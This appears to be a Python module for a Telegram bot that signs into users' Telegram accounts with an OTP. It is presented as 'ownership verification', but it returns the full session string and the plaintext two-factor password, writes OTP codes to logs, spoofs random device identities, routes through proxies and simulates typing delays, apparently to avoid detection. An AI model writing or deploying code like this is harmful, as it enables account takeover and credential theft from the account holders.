"""OTP Service for phone number verification and session creation"""
import asyncio
import logging
import time
from typing import Dict, Optional, Tuple
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telethon.crypto import AuthKey

logger = logging.getLogger(__name__)

class OtpService:
    """Handle OTP verification and session creation"""
    
    def __init__(self, api_id: int, api_hash: str, db_connection=None):
        self.api_id = api_id
        self.api_hash = api_hash
        self.db_connection = db_connection
        self.pending_sessions = {}  # {user_id: {phone, client, sent_code}}
        
    async def verify_account_ownership(self, phone_number: str, user_id: int) -> dict:
        """Send OTP to phone number for verification"""
        try:
            logger.info(f"Sending OTP to {phone_number} for user {user_id}")
            
            # Clean up any existing session for this user
            if user_id in self.pending_sessions:
                try:
                    await self.pending_sessions[user_id]['client'].disconnect()
                except:
                    pass
                del self.pending_sessions[user_id]
                logger.info(f"Cleaned up old session for user {user_id}")
            
            # Get proxy configuration
            proxy = None
            if self.db_connection:
                from app.models import ProxyManager
                proxy_manager = ProxyManager(self.db_connection)
                proxy = await proxy_manager.get_proxy_dict()
            
            # Device snooping for realistic sessions
            devices = [
                {"model": "Samsung SM-G973F", "system": "Android 10", "version": "8.4.1"},
                {"model": "Google Pixel 6", "system": "Android 13", "version": "8.7.1"},
                {"model": "OnePlus 9 Pro", "system": "Android 12", "version": "8.6.0"},
            ]
            import random
            device = random.choice(devices)
            
            # Create temporary client for OTP with device info and proxy
            client = TelegramClient(
                StringSession(),
                self.api_id,
                self.api_hash,
                proxy=proxy,
                connection_retries=2,
                retry_delay=1,
                device_model=device["model"],
                system_version=device["system"],
                app_version=device["version"]
            )
            
            await client.connect()
            
            # Send code request
            sent_code = await client.send_code_request(phone_number)
            
            # Store pending session
            self.pending_sessions[user_id] = {
                'phone': phone_number,
                'client': client,
                'sent_code': sent_code,
                'timestamp': time.time(),
                'code_used': False
            }
            
            logger.info(f"OTP sent successfully to {phone_number}")
            return {
                'success': True,
                'phone': phone_number,
                'code_hash': sent_code.phone_code_hash
            }
            
        except Exception as e:
            logger.error(f"Failed to send OTP to {phone_number}: {str(e)}")
            return {
                'success': False,
                'error': f"Failed to send OTP: {str(e)}"
            }
    
    async def verify_otp_and_create_session(self, user_id: int, otp_code: str, password: str = None) -> dict:
        """Verify OTP code and create session"""
        try:
            if user_id not in self.pending_sessions:
                return {
                    'success': False,
                    'error': 'No pending OTP session found. Please request a new code.'
                }
            
            session_data = self.pending_sessions[user_id]
            
            # Check if code was already used
            if session_data.get('code_used'):
                return {
                    'success': False,
                    'error': 'This code has already been used. Please request a new code.'
                }
            
            client = session_data['client']
            sent_code = session_data['sent_code']
            phone = session_data['phone']
            
            logger.info(f"Verifying OTP {otp_code} for user {user_id}")
            
            # Clean the OTP code
            otp_clean = otp_code.replace(' ', '')
            
            # If code has no separators (like "12345"), add small delay to simulate typing
            if len(otp_clean) == len(otp_code):
                logger.info(f"Code entered without separators, adding 0.5s delay")
                await asyncio.sleep(0.5)
            
            try:
                # Sign in with OTP
                await client.sign_in(phone, otp_clean, phone_code_hash=sent_code.phone_code_hash)
                
            except errors.SessionPasswordNeededError:
                if not password:
                    return {
                        'success': False,
                        'requires_password': True,
                        'step': '2fa',
                        'error': 'Two-factor authentication required'
                    }
                
                # Sign in with 2FA password
                await client.sign_in(password=password)
            
            except errors.PhoneCodeInvalidError:
                await client.disconnect()
                del self.pending_sessions[user_id]
                return {
                    'success': False,
                    'error': 'Invalid OTP code'
                }
            
            # Mark code as used after successful authentication
            session_data['code_used'] = True
            
            # Get account info
            me = await client.get_me()
            
            # Get session string
            session_string = StringSession.save(client.session)
            
            # Clean up
            await client.disconnect()
            del self.pending_sessions[user_id]
            
            logger.info(f"Successfully created session for {phone}")
            
            return {
                'success': True,
                'step': 'complete',
                'session_string': session_string,
                'account_info': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone
                },
                'tfa_password': password if password else None
            }
            
        except Exception as e:
            logger.error(f"OTP verification failed for user {user_id}: {str(e)}")
            
            # Clean up on error
            if user_id in self.pending_sessions:
                try:
                    await self.pending_sessions[user_id]['client'].disconnect()
                except:
                    pass
                del self.pending_sessions[user_id]
            
            return {
                'success': False,
                'error': f"Verification failed: {str(e)}"
            }
    
    async def cleanup_expired_sessions(self):
        """Clean up expired pending sessions"""
        try:
            current_time = time.time()
            expired_users = []
            
            for user_id, session_data in self.pending_sessions.items():
                if current_time - session_data['timestamp'] > 300:  # 5 minutes
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                try:
                    await self.pending_sessions[user_id]['client'].disconnect()
                except:
                    pass
                del self.pending_sessions[user_id]
                logger.info(f"Cleaned up expired session for user {user_id}")
                
        except Exception as e:
            logger.error(f"Session cleanup error: {e}")